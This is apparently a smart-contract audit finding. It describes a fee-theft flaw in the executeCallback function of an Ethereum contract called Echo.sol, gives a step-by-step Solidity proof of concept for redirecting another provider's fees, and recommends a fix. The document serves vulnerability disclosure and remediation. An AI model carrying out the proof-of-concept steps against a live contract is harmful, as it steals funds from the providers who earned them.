### Title
Unvalidated `providerToCredit` in `executeCallback` Allows Any Registered Provider to Steal Legitimate Provider Fees After Exclusivity Period — (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

In `Echo.sol`, the `executeCallback` function accepts a caller-controlled `providerToCredit` address and credits the full request fee to that address with no validation that it is the legitimate provider. After the exclusivity window expires, any registered provider can call `executeCallback`, pass their own address as `providerToCredit`, and redirect the entire fee that was earned by the original assigned provider to themselves.

### Finding Description

`executeCallback` enforces provider identity only during the exclusivity window:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
```

Once that window closes, the check is skipped entirely. The fee is then credited unconditionally to whatever address the caller supplies:

```solidity
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

There is no subsequent check that `providerToCredit == req.provider`, that `providerToCredit` is a registered provider, or that the caller has any relationship to the original request. The `ProviderInfo` mapping is a plain `mapping(address => ProviderInfo)`, so writing to an arbitrary address silently succeeds. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation

The original provider (`req.provider`) loses the fee they were promised for fulfilling the request. The attacker gains that fee in their own `accruedFeesInWei` balance and can withdraw it via `withdrawAsFeeManager`. The requester's callback is still executed, so the requester is not directly harmed, but the legitimate provider suffers a direct, quantifiable ETH loss equal to `req.fee - pythFee` per stolen request. [4](#0-3) 

### Likelihood Explanation

The attack is permissionless after two cheap setup steps (register as a provider, set self as fee manager). The attacker only needs to monitor the chain for requests whose exclusivity period has elapsed and supply valid Pyth price update data (freely available from Hermes). The exclusivity period is a single admin-configurable `uint32` that can be set to zero, making every request immediately vulnerable. Even with a non-zero period, any request the legitimate provider is slow to fulfill becomes a target. [5](#0-4) 

### Recommendation

After the exclusivity period, restrict `providerToCredit` to `req.provider` unless a penalty/redistribution mechanism is explicitly designed and audited. At minimum, add:

```solidity
require(
    providerToCredit == req.provider,
    "providerToCredit must be the assigned provider"
);
```

If the intent is to allow third-party fulfillment after the exclusivity period (as suggested by the TODO comments), the fee redistribution logic must be explicitly scoped — e.g., only allow a pre-approved set of providers to be credited, or require `msg.sender == providerToCredit` so the caller cannot redirect fees to an arbitrary address. [6](#0-5) 

### Proof of Concept

```solidity
// 1. Attacker registers as a provider (permissionless)
echo.registerProvider(0, 0, 0);

// 2. Attacker sets themselves as their own fee manager
echo.setFeeManager(attackerAddress);

// 3. Legitimate user submits a request targeting `legitimateProvider`
//    (done by a normal user, not the attacker)
uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
    legitimateProvider, publishTime, priceIds, callbackGasLimit
);

// 4. Attacker waits for exclusivityPeriodSeconds to elapse past publishTime

// 5. Attacker calls executeCallback, crediting themselves instead of legitimateProvider
bytes[] memory updateData = fetchFromHermes(publishTime, priceIds);
echo.executeCallback(
    attackerAddress,   // <-- providerToCredit: attacker, not legitimateProvider
    seq,
    updateData,
    priceIds
);
// _state.providers[attackerAddress].accruedFeesInWei now holds the stolen fee

// 6. Attacker withdraws
echo.withdrawAsFeeManager(attackerAddress, stolenAmount);
// ETH transferred to attacker; legitimateProvider receives nothing
``` [7](#0-6) [8](#0-7) [9](#0-8)

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
